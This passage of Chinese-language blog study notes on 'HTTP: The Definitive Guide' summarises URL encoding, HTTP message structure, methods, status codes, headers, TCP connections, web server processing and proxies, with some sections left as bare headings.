字符集"></a>2.4.1 URL 字符集</h4><p>通过<mark>转义序列</mark>, 就可以用 US-ASCII 字符集的有限子集对任意字符值或数据进行编码.</p><h4 id="2-4-2-编码机制"><a href="#2-4-2-编码机制" class="headerlink" title="2.4.2 编码机制"></a>2.4.2 编码机制</h4><p>为了避开安全自负即表示法带来的限制，人们设计了一种编码机制，用来在 URL 中表示各种不安全的字符。</p><p>这种编码机制就是通过一种”转义”表示法来表示不安全字符的，这种转义表示法包含:</p><ul><li>一个百分号 (%)</li><li>百分号后跟着两个表示字符 ASCII 码的十六进制数</li></ul><h4 id="2-4-3-字符限制"><a href="#2-4-3-字符限制" class="headerlink" title="2.4.3 字符限制"></a>2.4.3 字符限制</h4><p>即特殊字符，使用原意时需转义:<br><img src="/HTTP-%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-Notes/%E4%BF%9D%E7%95%99%E5%8F%8A%E5%8F%97%E9%99%90%E7%9A%84%E5%AD%97%E7%AC%A6.png" alt="保留及受限的字符"><br><img src="/../img/%E4%BF%9D%E7%95%99%E5%8F%8A%E5%8F%97%E9%99%90%E7%9A%84%E5%AD%97%E7%AC%A6.png" alt="保留及受限的字符"></p><h3 id="2-5-方案的世界"><a href="#2-5-方案的世界" class="headerlink" title="2.5 方案的世界"></a>2.5 方案的世界</h3><p>常见的方案及格式:<br><img src="/../img/%E5%B8%B8%E8%A7%81%E7%9A%84%E6%96%B9%E6%A1%88%E5%8F%8A%E6%A0%BC%E5%BC%8F.png" alt="常见的方案及格式"><br><img src="/../img/%E5%B8%B8%E8%A7%81%E7%9A%84%E6%96%B9%E6%A1%88%E5%8F%8A%E6%A0%BC%E5%BC%8F2.png" alt="常见的方案及格式"><br><img src="/../img/%E5%B8%B8%E8%A7%81%E7%9A%84%E6%96%B9%E6%A1%88%E5%8F%8A%E6%A0%BC%E5%BC%8F3.png" alt="常见的方案及格式"></p><h2 id="第3章-HTTP-报文"><a href="#第3章-HTTP-报文" class="headerlink" title="第3章 HTTP 报文"></a>第3章 HTTP 报文</h2><h3 id="3-1-报文流"><a href="#3-1-报文流" class="headerlink" title="3.1 报文流"></a>3.1 报文流</h3><p>HTTP 报文是在 HTTP 应用程序之间发送的数据块。</p><p>报文在客户端、服务器和代理之间流动，术语 “流入”, “流出”, “上游”, “下游” 都是用来描述报文方向的。</p><h4 id="3-1-1-报文"><a href="#3-1-1-报文" class="headerlink" title="3.1.1 报文"></a>3.1.1 报文</h4><p>HTTP 使用术语 流入 (inbound) 和 流出 (outbound) 来描述事务处理 (transaction) 的方向。</p><p>“流入” 是流向服务器方向，”流出” 是流向用户 Agent 代理方向。</p><h4 id="3-1-2-报文向下游流动"><a href="#3-1-2-报文向下游流动" class="headerlink" title="3.1.2 报文向下游流动"></a>3.1.2 报文向下游流动</h4><p>不管是请求报文还是响应报文，所有报文都会向下游 (downstream) 流动。所有报文的发送者都在接收者的上游 (upstream).</p><h3 id="3-2-报文的组成部分"><a href="#3-2-报文的组成部分" class="headerlink" title="3.2 报文的组成部分"></a>3.2 报文的组成部分</h3><p>每条报文都包含一条来自客户端的请求，活着一条来自服务器的响应。</p><p>其包含三个部分:<br><img src="/../img/HTTP%E6%8A%A5%E6%96%87%E7%9A%84%E4%B8%89%E4%B8%AA%E9%83%A8%E5%88%86.png" alt="HTTP 报文的三个部分"><br><code>Content-Type</code> 行说明了主体是什么。</p><p><code>Content-Length</code> 行说明了主体有多大。</p><h4 id="3-2-1-报文的语法"><a href="#3-2-1-报文的语法" class="headerlink" title="3.2.1 报文的语法"></a>3.2.1 报文的语法</h4><p>请求报文格式:</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">&lt;<span class="hljs-keyword">method</span>&gt; &lt;<span class="hljs-title function_">request</span>-<span class="hljs-title function_">URL</span>&gt; &lt;<span class="hljs-title function_">version</span>&gt; # 这是请求行，字段用空格分隔<br>&lt;<span class="hljs-title function_">headers</span>&gt;<br><br>&lt;<span class="hljs-title function_">entity</span>-<span class="hljs-title function_">body</span>&gt;<br></code></pre></td></tr></table></figure><p>响应报文格式:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;version&gt;</span> <span class="hljs-section">&lt;status&gt;</span> <span class="hljs-section">&lt;reason-phrase&gt;</span> <span class="hljs-comment"># 这是响应行，也由空格分隔字段</span><br><span class="hljs-section">&lt;headers&gt;</span><br><br><span class="hljs-section">&lt;entity-body&gt;</span><br></code></pre></td></tr></table></figure><p>一组 HTTP 首部总应该以一个空行结束，甚至即使没有首部和实体的主体部分也应如此.</p><p>有些服务器会实现一些自己的请求方法，这些附加的方法是对 HTTP 规范的扩展，被称为<mark>扩展方法</mark>.</p><p><img src="/../img/%E7%8A%B6%E6%80%81%E7%A0%81%E5%88%86%E7%B1%BB.png" alt="状态码分类"></p><p>原因短语是响应起始行中的最后一个组件. 它为状态码提供了文本形式的解释.</p><p>版本号不会被当做小数处理，版本中的每个数字都会被当做一个单独的数字来处理，因此，在比较 HTTP 版本时，每个数字都必须要单独进行比较，以便确定哪个版本更高, 如: HTTP&#x2F;2.22 比 HTTP&#x2F;2.3 的版本高.</p><h4 id="3-2-3-首部"><a href="#3-2-3-首部" class="headerlink" title="3.2.3 首部"></a>3.2.3 首部</h4><p>每个 HTTP 首部都有一种简单的语法: 名字后面跟着冒号 <code>:</code> , 然后跟上可选的空格，再跟上字段值，最后是一个 CRLF.</p><p><img src="/../img/%E5%B8%B8%E8%A7%81%E7%9A%84%E9%A6%96%E9%83%A8%E5%AE%9E%E4%BE%8B.png" alt="常见的首部实例"></p><h5 id="首部延续行"><a href="#首部延续行" class="headerlink" title="首部延续行"></a>首部延续行</h5><p>将长的首部行分为多行可以提高可读性，多出来的每行前面至少要有一个空格或制表符.</p><h4 id="3-2-4-实体的主体部分"><a href="#3-2-4-实体的主体部分" class="headerlink" title="3.2.4 实体的主体部分"></a>3.2.4 实体的主体部分</h4><p>HTTP 报文的第三部分是可选的实体主体部分，实体的主体是 HTTP 报文的负荷，就是 HTTP 要传输的内容。</p><h4 id="3-2-5-版本-0-9-的报文"><a href="#3-2-5-版本-0-9-的报文" class="headerlink" title="3.2.5 版本 0.9 的报文"></a>3.2.5 版本 0.9 的报文</h4><h3 id="3-3-方法"><a href="#3-3-方法" class="headerlink" title="3.3 方法"></a>3.3 方法</h3><p>如果一台服务器要与 HTTP 1.1 兼容，那么只要为其资源实现 GET 方法和 HEAD 方法就可以了.</p><h4 id="3-3-1-安全方法"><a href="#3-3-1-安全方法" class="headerlink" title="3.3.1 安全方法"></a>3.3.1 安全方法</h4><p>HTTP 定义了一组被称为<mark>安全方法</mark>的方法，GET 方法和 HEAD 方法都被认为是安全的。</p><h4 id="3-3-2-GET"><a href="#3-3-2-GET" class="headerlink" title="3.3.2 GET"></a>3.3.2 GET</h4><p>GET 是最常用的方法，通常用于请求服务器发送某个资源.</p><h4 id="3-3-3-HEAD"><a href="#3-3-3-HEAD" class="headerlink" title="3.3.3 HEAD"></a>3.3.3 HEAD</h4><p>HEAD 方法和 GET 方法的行为很类似，但服务器在响应中只返回首部。不会反悔实体的主体部分.</p><h4 id="3-3-4-PUT"><a href="#3-3-4-PUT" class="headerlink" title="3.3.4 PUT"></a>3.3.4 PUT</h4><p>向服务器写入文档。</p><h4 id="3-3-5-POST"><a href="#3-3-5-POST" class="headerlink" title="3.3.5 POST"></a>3.3.5 POST</h4><p>通常用于支持 HTML 的表单。</p><h4 id="3-3-6-TRACE"><a href="#3-3-6-TRACE" class="headerlink" title="3.3.6 TRACE"></a>3.3.6 TRACE</h4><p>客户端发起一个请求时这个请求可能要穿过防火墙、代理、网关或其他一些应用程序，每个中间节点都可能会修改原始的 HTTP 请求。TRACE 方法允许客户端在最终将请求发送给服务器时，看看它变成了什么样子.</p><p>TRACE 方法只要用于诊断。</p><h4 id="3-3-7-OPTIONS"><a href="#3-3-7-OPTIONS" class="headerlink" title="3.3.7 OPTIONS"></a>3.3.7 OPTIONS</h4><p>该方法请求 Web 服务器告知其支持的各种功能。</p><h4 id="3-3-8-DELETE"><a href="#3-3-8-DELETE" class="headerlink" title="3.3.8 DELETE"></a>3.3.8 DELETE</h4><p>请求服务器删除请求 URL 所指定的资源.</p><p>客户端应用程序无法保证删除操作一定会被执行。因为 HTTP 规范允许服务器在不通知客户端的情况下撤销请求.</p><h3 id="3-4-状态码"><a href="#3-4-状态码" class="headerlink" title="3.4 状态码"></a>3.4 状态码</h3><p>HTTP 状态码被分成五大类。</p><p>状态码为客户端提供了一种理解事务处理结果的便捷方式.</p><h4 id="3-4-1-100-199-–-信息性状态码"><a href="#3-4-1-100-199-–-信息性状态码" class="headerlink" title="3.4.1 100 ~ 199 – 信息性状态码"></a>3.4.1 100 ~ 199 – 信息性状态码</h4><h4 id="3-4-2-200-299-–-成功状态码"><a href="#3-4-2-200-299-–-成功状态码" class="headerlink" title="3.4.2 200 ~ 299 – 成功状态码"></a>3.4.2 200 ~ 299 – 成功状态码</h4><h4 id="3-4-3-300-399-–-重定向状态码"><a href="#3-4-3-300-399-–-重定向状态码" class="headerlink" title="3.4.3 300 ~ 399 – 重定向状态码"></a>3.4.3 300 ~ 399 – 重定向状态码</h4><p>重定向状态码要么告诉客户端使用替代位置来访问他们所感兴趣的资源，要么就提供一个替代的响应而不是资源的内容。</p><h4 id="3-4-4-400-499-–-客户端错误状态码"><a href="#3-4-4-400-499-–-客户端错误状态码" class="headerlink" title="3.4.4 400 ~ 499 – 客户端错误状态码"></a>3.4.4 400 ~ 499 – 客户端错误状态码</h4><h4 id="3-4-5-500-599-–-服务器错误状态码"><a href="#3-4-5-500-599-–-服务器错误状态码" class="headerlink" title="3.4.5 500 ~ 599 – 服务器错误状态码"></a>3.4.5 500 ~ 599 – 服务器错误状态码</h4><p>服务器自身出错了.</p><h3 id="3-5-首部"><a href="#3-5-首部" class="headerlink" title="3.5 首部"></a>3.5 首部</h3><p>在请求和响应报文中都可以用首部来提供信息,有些首部是某种报文专用的，有些首部更通用一些。</p><p>五个主要类型:</p><ul><li>通用首部</li><li>请求首部</li><li>响应首部</li><li>实体首部</li><li>扩展首部</li></ul><h4 id="3-5-1-通用首部"><a href="#3-5-1-通用首部" class="headerlink" title="3.5.1 通用首部"></a>3.5.1 通用首部</h4><p>这些首部提供了与报文相关的最基本的信息。<br><img src="/../img/%E9%80%9A%E7%94%A8%E7%9A%84%E4%BF%A1%E6%81%AF%E6%80%A7%E9%A6%96%E9%83%A8.png" alt="通用的信息性首部"></p><h4 id="3-5-2-请求首部"><a href="#3-5-2-请求首部" class="headerlink" title="3.5.2 请求首部"></a>3.5.2 请求首部</h4><p>请求首部是在请求报文中有意义的首部，用于说明是谁或什么在发送请求、请求源自何处，或者客户端的喜好及能力.</p><h5 id="Accept-首部"><a href="#Accept-首部" class="headerlink" title="Accept 首部"></a>Accept 首部</h5><h5 id="条件请求首部"><a href="#条件请求首部" class="headerlink" title="条件请求首部"></a>条件请求首部</h5><p>为请求加上某些限制</p><h5 id="安全请求首部"><a href="#安全请求首部" class="headerlink" title="安全请求首部"></a>安全请求首部</h5><p>要求客户端在获取特定的资源之前，先对自身进行认证。</p><h5 id="代理请求首部"><a href="#代理请求首部" class="headerlink" title="代理请求首部"></a>代理请求首部</h5><h4 id="3-5-3-响应首部"><a href="#3-5-3-响应首部" class="headerlink" title="3.5.3 响应首部"></a>3.5.3 响应首部</h4><p>响应首部为客户端提供了一些额外信息，比如谁在发送响应、响应者的功能，甚至与响应相关的一些特殊指令.</p><h5 id="协商首部"><a href="#协商首部" class="headerlink" title="协商首部"></a>协商首部</h5><p>就是资源有多种，可以考虑要哪个。</p><h5 id="安全响应首部"><a href="#安全响应首部" class="headerlink" title="安全响应首部"></a>安全响应首部</h5><p>HTTP 的质询&#x2F;响应认证机制的响应侧.</p><h4 id="3-5-3-实体首部"><a href="#3-5-3-实体首部" class="headerlink" title="3.5.3 实体首部"></a>3.5.3 实体首部</h4><p>提供了有关实体及其内容的大量信息.</p><h5 id="内容首部"><a href="#内容首部" class="headerlink" title="内容首部"></a>内容首部</h5><p>与实体内容有关的信息.</p><h5 id="实体缓存首部"><a href="#实体缓存首部" class="headerlink" title="实体缓存首部"></a>实体缓存首部</h5><p>提供了与被缓存实体有关的信息.</p><h2 id="第四章-连接管理"><a href="#第四章-连接管理" class="headerlink" title="第四章 连接管理"></a>第四章 连接管理</h2><p>HTTP 连接是 HTTP 报文传输的关键通道.</p><h3 id="4-1-TCP-连接"><a href="#4-1-TCP-连接" class="headerlink" title="4.1 TCP 连接"></a>4.1 TCP 连接</h3><p>世界上几乎所有的 HTTP 通信都是由 TCP&#x2F;IP 承载的.</p><h4 id="4-1-1-TCP-的可靠数据管道"><a href="#4-1-1-TCP-的可靠数据管道" class="headerlink" title="4.1.1 TCP 的可靠数据管道"></a>4.1.1 TCP 的可靠数据管道</h4><p>HTTP 连接实际上就是 TCP 连接及其使用规则。</p><p>TCP 为 HTTP 提供了一条可靠的比特传输管道.<br><img src="/TCP%E8%BF%9E%E6%8E%A5.png" alt="TCP连接"></p><h4 id="4-1-2-TCP-流是分段的、由-IP-分组传送"><a href="#4-1-2-TCP-流是分段的、由-IP-分组传送" class="headerlink" title="4.1.2 TCP 流是分段的、由 IP 分组传送"></a>4.1.2 TCP 流是分段的、由 IP 分组传送</h4><p>TCP 的数据是通过 IP 数据报的小数据块来发送的.</p><p>HTTPS 就是在 HTTP 和 TCP 之间插入了一个密码加密层.</p><p><img src="/HTTP%E5%92%8CHTTPS%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88.png" alt="HTTP和HTTPS网络协议栈"></p><p>每个 IP 数据报都包括:</p><ul><li>一个 IP 分组首部</li><li>一个 TCP 首段</li><li>一个 TCP 数据块</li></ul><h4 id="4-1-3-保持-TCP-连接持续不断地运行"><a href="#4-1-3-保持-TCP-连接持续不断地运行" class="headerlink" title="4.1.3 保持 TCP 连接持续不断地运行"></a>4.1.3 保持 TCP 连接持续不断地运行</h4><p>在任何时刻计算机都可以有几条 TCP 连接处于打开状态。TCP 是通过端口号来保持所有这些连接持续不断地运行.</p><p>端口号和雇员使用的电话分机号很类似.</p><p>IP 地址可以将你连接到正确的计算机，而端口号则可以将你连接到正确的应用程序上去.</p><p>TCP 连接是通过 4 个值来识别的:</p><ul><li>源 IP 地址</li><li>源端口号</li><li>目的 IP 地址</li><li>目的端口号<br>这 4 个值一起唯一定义了一条连接。</li></ul><h4 id="4-1-4-用-TCP-套接字编程"><a href="#4-1-4-用-TCP-套接字编程" class="headerlink" title="4.1.4 用 TCP 套接字编程"></a>4.1.4 用 TCP 套接字编程</h4><p>操作系统提供了一些操纵其 TCP 连接的工具：<br><img src="/%E5%B8%B8%E8%A7%81%E5%A5%97%E6%8E%A5%E5%AD%97API.png" alt="常见套接字API"></p><p>通信过程:<br><img src="/TCP%E9%80%9A%E4%BF%A1%E8%BF%87%E7%A8%8B.png" alt="TCP通信过程"></p><h3 id="4-2-对-TCP-性能的考虑"><a href="#4-2-对-TCP-性能的考虑" class="headerlink" title="4.2 对 TCP 性能的考虑"></a>4.2 对 TCP 性能的考虑</h3><p>HTTP 事务的性能在很大程度上取决于底层 TCP 通道的性能。</p><h4 id="4-2-1-HTTP-事务的时延"><a href="#4-2-1-HTTP-事务的时延" class="headerlink" title="4.2.1 HTTP 事务的时延"></a>4.2.1 HTTP 事务的时延</h4><h3 id="4-3-HTTP-连接的处理"><a href="#4-3-HTTP-连接的处理" class="headerlink" title="4.3 HTTP 连接的处理"></a>4.3 HTTP 连接的处理</h3><h4 id="4-3-1-常被误解的-Connection-首部"><a href="#4-3-1-常被误解的-Connection-首部" class="headerlink" title="4.3.1 常被误解的 Connection 首部"></a>4.3.1 常被误解的 Connection 首部</h4><p>HTTP 允许在客户端和最终的源端服务器之间存在一串 HTTP 中间实体.</p><p>在某些情况下，两个相邻的 HTTP 应用程序会为它们共享的连接应用一组选项。</p><p>HTTP 的 Connection 首部字段中有一个由逗号分隔的<mark>连接标签</mark>列表，用于指定不会传播到其他连接中的选项.</p><h4 id="4-3-2-串行事务处理时延"><a href="#4-3-2-串行事务处理时延" class="headerlink" title="4.3.2 串行事务处理时延"></a>4.3.2 串行事务处理时延</h4><h1 id="第二部分-HTTP-结构"><a href="#第二部分-HTTP-结构" class="headerlink" title="第二部分 HTTP 结构"></a>第二部分 HTTP 结构</h1><h2 id="第5章-Web-服务器"><a href="#第5章-Web-服务器" class="headerlink" title="第5章 Web 服务器"></a>第5章 Web 服务器</h2><h3 id="5-1-各种形状和尺寸的-Web-服务器"><a href="#5-1-各种形状和尺寸的-Web-服务器" class="headerlink" title="5.1 各种形状和尺寸的 Web 服务器"></a>5.1 各种形状和尺寸的 Web 服务器</h3><p>“Web 服务器” 可以用来表示 Web 服务器的软件，也可以用来表示提供 Web 页面的特定设备或计算机.</p><h4 id="5-1-1-Web-服务器的实现"><a href="#5-1-1-Web-服务器的实现" class="headerlink" title="5.1.1 Web 服务器的实现"></a>5.1.1 Web 服务器的实现</h4><h4 id="5-1-2-通用软件-Web-服务器"><a href="#5-1-2-通用软件-Web-服务器" class="headerlink" title="5.1.2 通用软件 Web 服务器"></a>5.1.2 通用软件 Web 服务器</h4><h4 id="5-1-3-Web-服务器设备"><a href="#5-1-3-Web-服务器设备" class="headerlink" title="5.1.3 Web 服务器设备"></a>5.1.3 Web 服务器设备</h4><p>Web server appliance 是预先打包好的软硬件解决方案.</p><h4 id="5-1-3-嵌入式-Web-服务器"><a href="#5-1-3-嵌入式-Web-服务器" class="headerlink" title="5.1.3 嵌入式 Web 服务器"></a>5.1.3 嵌入式 Web 服务器</h4><h3 id="5-2-最小的-Perl-Web-服务器"><a href="#5-2-最小的-Perl-Web-服务器" class="headerlink" title="5.2 最小的 Perl Web 服务器"></a>5.2 最小的 Perl Web 服务器</h3><h3 id="5-3-实际的-Web-服务器会做些什么"><a href="#5-3-实际的-Web-服务器会做些什么" class="headerlink" title="5.3 实际的 Web 服务器会做些什么"></a>5.3 实际的 Web 服务器会做些什么</h3><ol><li>建立连接</li><li>接收请求</li><li>处理请求</li><li>访问资源</li><li>构建响应</li><li>发送响应</li><li>记录事务处理过程，会将与已完成事务有关的内容记录在一个日志文件中</li></ol><h3 id="5-4-第一步-–-接收客户端连接"><a href="#5-4-第一步-–-接收客户端连接" class="headerlink" title="5.4 第一步 – 接收客户端连接"></a>5.4 第一步 – 接收客户端连接</h3><h4 id="5-4-1-处理新连接"><a href="#5-4-1-处理新连接" class="headerlink" title="5.4.1 处理新连接"></a>5.4.1 处理新连接</h4><p>Web 服务器可以随意拒绝或立即关闭任意一条连接。</p><h4 id="5-4-2-客户端主机名识别"><a href="#5-4-2-客户端主机名识别" class="headerlink" title="5.4.2 客户端主机名识别"></a>5.4.2 客户端主机名识别</h4><p>可以用 “反向 DNS” 对大部分 Web 服务器进行配置，以便将客户端 IP 地址转换成客户端主机名。</p><p>主机名查找可能会花费很长时间，这样会降低 Web 事务处理的速度.</p><p>可以用配置指令 HostnameLookups 启用 Apache 的主机查找功能.</p><h4 id="5-4-3-通过-ident-确定客户端用户"><a href="#5-4-3-通过-ident-确定客户端用户" class="headerlink" title="5.4.3 通过 ident 确定客户端用户"></a>5.4.3 通过 ident 确定客户端用户</h4><p>有些 Web 服务器还支持 IETF 的 idnet 协议，服务器可以通过 ident 协议找到发起 HTTP 连接的用户名.</p><p>如果客户端支持 ident 协议，就在 TCP 端口 113 上监听 ident 请求.</p><p>可以通过 Apache 的 IdentityCheck on 指令告知 Apache Web 服务器使用 ident 查找功能.</p><h3 id="5-5-第二步-–-接收请求报文"><a href="#5-5-第二步-–-接收请求报文" class="headerlink" title="5.5 第二步 – 接收请求报文"></a>5.5 第二步 – 接收请求报文</h3><p>连接上有数据到达时，Web 服务器会从网络连接中读取数据，并将请求报文中的内容解析出来。</p><h4 id="5-5-1-报文的内部表示法"><a href="#5-5-1-报文的内部表示法" class="headerlink" title="5.5.1 报文的内部表示法"></a>5.5.1 报文的内部表示法</h4><p>有些 Web 服务器还会用便于进行报文操作的内部数据结构来存储请求报文.</p><h4 id="5-5-2-连接的输入-x2F-输出处理结构"><a href="#5-5-2-连接的输入-x2F-输出处理结构" class="headerlink" title="5.5.2 连接的输入&#x2F;输出处理结构"></a>5.5.2 连接的输入&#x2F;输出处理结构</h4><p>不同的 Web 服务器结构会以不同的方式为请求服务:</p><ul><li>单线程 Web 服务器</li><li>多进程及多线程 Web 服务器</li><li>复用 I&#x2F;O 的服务器</li><li>复用的多线程 Web 服务器</li></ul><p><img src="/../img/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E7%BB%93%E6%9E%84.png" alt="Web服务器输入输出结构"></p><h3 id="5-6-第三步-–-处理请求"><a href="#5-6-第三步-–-处理请求" class="headerlink" title="5.6 第三步 – 处理请求"></a>5.6 第三步 – 处理请求</h3><h3 id="5-7-第四步-–-对资源的映射及访问"><a href="#5-7-第四步-–-对资源的映射及访问" class="headerlink" title="5.7 第四步 – 对资源的映射及访问"></a>5.7 第四步 – 对资源的映射及访问</h3><p>在 Web 服务器将内容传送给客户端之前，要将请求报文中的 URI 映射为 Web 服务器上适当的内容或内容生成器.</p><h4 id="5-7-1-docroot"><a href="#5-7-1-docroot" class="headerlink" title="5.7.1 docroot"></a>5.7.1 docroot</h4><p>文档的根目录即 document root (docroot).</p><p>最简单的资源映射形式就是用请求 URI 作为名字来访问 Web 服务器文件系统中的文件.</p><h5 id="虚拟托管的-docroot"><a href="#虚拟托管的-docroot" class="headerlink" title="虚拟托管的 docroot"></a>虚拟托管的 docroot</h5><p>虚拟托管的 Web 服务器会在同一台 Web 服务器上提供多个 Web 站点，每个站点在服务器上都有自己独有的文档根目录。</p><h5 id="用户的主目录-docroot"><a href="#用户的主目录-docroot" class="headerlink" title="用户的主目录 docroot"></a>用户的主目录 docroot</h5><p>Docroot 的另一种常见应用是在 Web 服务器上为人们提供私有的 Web 站点. 通常会把那些以斜杠和波浪号 (&#x2F;~) 开始，后面跟着用户名的 URI 映射为此用户的私有文档根目录.</p><h4 id="5-7-2-目录列表"><a href="#5-7-2-目录列表" class="headerlink" title="5.7.2 目录列表"></a>5.7.2 目录列表</h4><p>Web 服务器可以接收对目录 URL 的请求，其路径可以解析为一个目录。</p><p>大多数 Web 服务器都会去查找目录中一个名为 index.html 或 index.htm 的文件来代表此目录。如果用户请求的是一个目录的 URL, 而且这个目录中有一个名为 index.html (或 index.htm) 的文件，服务器就会返回那个文件的内容.</p><p>在 Apache Web 服务器上，可以用配置命令 DirectoryIndex 来配置要作为默认目录文件使用的文件名集合。指令 DirectoryIndex 会按照优先顺序列出所有可以作为目录索引文件使用的文件名.</p><h4 id="5-7-3-动态内容资源的映射"><a href="#5-7-3-动态内容资源的映射" class="headerlink" title="5.7.3 动态内容资源的映射"></a>5.7.3 动态内容资源的映射</h4><h3 id="5-8-第五步-–-构建响应"><a href="#5-8-第五步-–-构建响应" class="headerlink" title="5.8 第五步 – 构建响应"></a>5.8 第五步 – 构建响应</h3><h3 id="5-9-第六步-–-发送响应"><a href="#5-9-第六步-–-发送响应" class="headerlink" title="5.9 第六步 – 发送响应"></a>5.9 第六步 – 发送响应</h3><h3 id="5-10-第七部-–-记录日志"><a href="#5-10-第七部-–-记录日志" class="headerlink" title="5.10 第七部 – 记录日志"></a>5.10 第七部 – 记录日志</h3><h2 id="第六章-代理"><a href="#第六章-代理" class="headerlink" title="第六章 代理"></a>第六章 代理</h2><p>Web 代理 (proxy) 服务器是网络的中间实体，代理位于客户端和服务器之间，在各端点之间来回传送 HTTP 报文.</p><h3 id="6-1-Web-的中间实体"><a href="#6-1-Web-的中间实体" class="headerlink" title="6.1 Web 的中间实体"></a>6.1 Web 的中间实体</h3><p>HTTP 的代理服务既是 Web 服务器又是 Web 客户端。</p><h4 id="6-1-1-私有和共享代理"><a href="#6-1-1-私有和共享代理" class="headerlink" title="6.1.1 私有和共享代理"></a>6.1.1 私有和共享代理</h4><p>代理服务器可以使某个客户端专用的，也可以是很多客户端共享的。</p><p>单个客户端专用的代理称为<mark>私有代理</mark>.</p><p>众多客户端共享的代理被称为<mark>公共代理</mark>. 其成本效率高，更容易管理.</p><h4 id="6-1-2-代理与网关的对比"><a href="#6-1-2-代理与网关的对比" class="headerlink" title="6.1.2 代理与网关的对比"></a>6.1.2 代理与网关的对比</h4><p>代理连接的是两个或多个使用相同协议的应用程序。</p><p>网关连接的是两个或多个使用不同协议的端点。其扮演的是”协议转换器”的角色.<br><img src="/%E4%BB%A3%E7%90%86%E5%92%8C%E7%BD%91%E5%85%B3%E7%9A%84%E5%8C%BA%E5%88%AB.png" alt="代理和网关的区别"></p><h3 id="6-2-为什么使用代理"><a href="#6-2-为什么使用代理" class="headerlink" title="6.2 为什么使用代理"></a>6.2 为什么使用代理</h3><p>代理服务器可以看到并接触到所有流过的 HTTP 流量，所以代理可以监视流量并对其进行修改。</p><p>可以用反向代理来提高访问慢速 Web 服务器上公共内容时的性能，这些反向代理通常被称为服务器加速器 (server accelerator).</p><h3 id="6-3-代理会去往何处"><a href="#6-3-代理会去往何处" class="headerlink" title="6.3 代理会去往何处"></a>6.3 代理会去往何处</h3><h4 id="6-3-1-代理服务器的部署"><a href="#6-3-1-代理服务器的部署" class="headerlink" title="6.3.1 代理服务器的部署"></a>6.3.1 代理服务器的部署</h4><p>部署代理的几种方式:</p><ul><li>出口代理，将代理固定在本地网络的出口点，以便控制本地网络与大型因特网之间的流量.</li><li>访问 (入口) 代理，将代理放在 ISP 访问点上，用以处理来自客户的聚合请求.</li><li>反向代理, 部署在网络边缘，在 Web 服务器之前，作为替代物 (即反向代理) 使用, 在那里它们可以处理所有传送给 Web 服务器的请求, 并只在必要时向 Web 服务器请求资源. 反向代理通常会直接冒用 Web 服务器的名字和 IP 地址</li><li>网络交换代理, 将具有足够处理能力的代理放在网络之间的因特网对等交换点上，通过缓存来减轻因特网节点的拥塞，并对流量进行监视</li></ul><h4 id="6-3-2-代理的层次结构-proxy-hierarchy"><a href="#6-3-2-代理的层次结构-proxy-hierarchy" class="headerlink" title="6.3.2 代理的层次结构 (proxy hierarchy)"></a>6.3.2 代理的层次结构 (proxy hierarchy)</h4><p>报文会从一个代理传给另一个代理.<br><img src="/%E4%B8%89%E7%BA%A7%E7%9A%84%E4%BB%A3%E7%90%86%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84.png" alt="三级的代理层次结构"></p><p>靠近服务器的代理为<mark>父代理</mark>.</p><p>靠近客户端的代理为<mark>子代理</mark></p><h5 id="代理层次结构的内容路由"><a href="#代理层次结构的内容路由" class="headerlink" title="代理层次结构的内容路由"></a>代理层次结构的内容路由</h5><p>代理层次结构可以是动态的, 即并不是单一的路线。</p><h4 id="6-3-3-代理是如何获取流量的"><a href="#6-3-3-代理是如何获取流量的" class="headerlink" title="6.3.3 代理是如何获取流量的"></a>6.3.3 代理是如何获取流量的</h4><p>有四种常见方式可以使客户流量流向代理:</p><ul><li>修改客户端, 手动将客户端配置为使用代理服务器</li><li>修改网络, </li><li>修改 DNS 的命名空间</li><li>修改 Web 服务器</li></ul><h3 id="6-4-客户端的代理设置"><a href="#6-4-客户端的代理设置" class="headerlink" title="6.4 客户端的代理设置"></a>6.4 客户端的代理设置</h3><p>所有现代的 Web 浏览器都允许用户对代理使用进行配置。</p><p>几种方法:</p><ul><li>手工配置</li><li>预先配置浏览器</li><li>代理的自动配置</li><li>WPAD 的代理发现</li></ul><h3 id="6-5-与代理请求有关的一些棘手问题"><a href="#6-5-与代理请求有关的一些棘手问题" class="headerlink" title="6.5 与代理请求有关的一些棘手问题"></a>6.5 与代理请求有关的一些棘手问题</h3><h4 id="6-5-1-代理-URI-与服务器-URI-不同"><a href="#6-5-1-代理-URI-与服务器-URI-不同" class="headerlink" title="6.5.1 代理 URI 与服务器 URI 不同"></a>6.5.1 代理 URI 与服务器 URI 不同</h4><p>除了这一点之外，Web 服务器报文和 Web 代理报文的语法是一样的。</p><p>客户端向 Web 服务器发送请求时，请求行中只包含部分 URI (URI 中不包含方案、主机或端口).</p><p>客户端向代理发送请求时，请求行中则包含完整的 URI.</p><h4 id="6-5-2-与虚拟主机一样的问题"><a href="#6-5-2-与虚拟主机一样的问题" class="headerlink" title="6.5.2 与虚拟主机一样的问题"></a>6.5.2 与虚拟主机一样的问题</h4><h4 id="6-5-3-拦截代理会收到部分-URI"><a href="#6-5-3-拦截代理会收到部分-URI" class="headerlink" title="6.5.3 拦截代理会收到部分 URI"></a>6.5.3 拦截代理会收到部分 URI</h4><h3 id="6-6-追踪报文"><a href="#6-6-追踪报文" class="headerlink" title="6.6 追踪报文"></a>6.6 追踪报文</h3><h4 id="6-6-2-Via-首部"><a href="#6-6-2-Via-首部" class="headerlink" title="6.6.2 Via 首部"></a>6.6.2 Via 首部</h4><p>Via 首部字段列出了与报文途径的每个中间节点有关的信息.</p><p>报文每经过一个节点，都必须将这个中间节点添加到 Via 列表的末尾.</p><h5 id="Via-的语法"><a href="#Via-的语法" class="headerlink" title="Via 的语法"></a>Via 的语法</h5><p>由逗号 <code>,</code> 分隔。</p><p>每个 waypoint 最多包含四个组件:</p><ul><li>可选的协议名</li><li>必选的协议版本</li><li>必选的节点名</li><li>可选的描述性注释</li></ul><h5 id="Via-的请求和响应路径"><a 